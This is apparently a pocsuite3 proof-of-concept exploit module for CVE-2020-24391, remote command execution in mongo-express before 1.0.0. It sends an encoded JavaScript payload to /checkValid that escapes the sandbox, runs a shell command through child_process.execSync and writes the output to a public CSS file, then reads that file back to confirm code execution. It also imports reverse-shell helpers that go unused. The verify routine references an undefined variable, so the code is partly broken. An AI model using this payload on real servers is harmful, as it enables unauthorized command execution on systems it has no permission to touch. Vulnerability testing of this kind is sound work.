from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict
import re
class DemoPOC(POCBase):
    vulID = 'CVE-2020-24391'  # ssvid
    version = '1.0'
    name = 'mongo-express远程命令执行漏洞'
    appName = 'mongo-express'
    appVersion = '<1.0.0'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''mongo-express before 1.0.0 存在安全漏洞，该漏洞源于以一种不安全的方式实现了某些高级语法的支持。'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):#验证模式
        result = {}
        s = requests.session()
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        try:
            target1 = self.url+"/"
            target2 = self.url+"/checkValid"
            target3 = self.url+"/public/css/aaaa1234.css"
            data = "document=++++++++++++%28%28%29+%3D%3E+%7B%0A++++++++const+process+%3D+clearImmediate.constructor%28%22return+process%3B%22%29%28%29%3B%0A++++++++const+result+%3D+process.mainModule.require%28%22child_process%22%29.execSync%28%22id+%3E+build%2Fcss%2Faaaa1234.css%22%29%3B%0A++++++++console.log%28%22Result%3A+%22+%2B+result%29%3B%0A++++++++return+true%3B%0A++++%7D%29%28%29++++++++"
            r = s.get(url=target1,timeout=5,verify=False,allow_redirects=False)
            r1 = s.post(url=target2,timeout=5,verify=False,allow_redirects=False,data=data,headers=headers)
            r2 = s.get(url=target3,verify=False,allow_redirects=False,timeout=5)
            if (re.search(r"""((u|g)id|groups)=[0-9]{1,4}\([a-z0-9]+\)""",r2.text)) and (r2.status_code == 200):
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = target
                result['VerifyInfo']['payload'] = "/public/css/aaaa1234.css"
                return self.parse_output(result)
        except Exception as e:
            print(e)
            pass

    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(DemoPOC)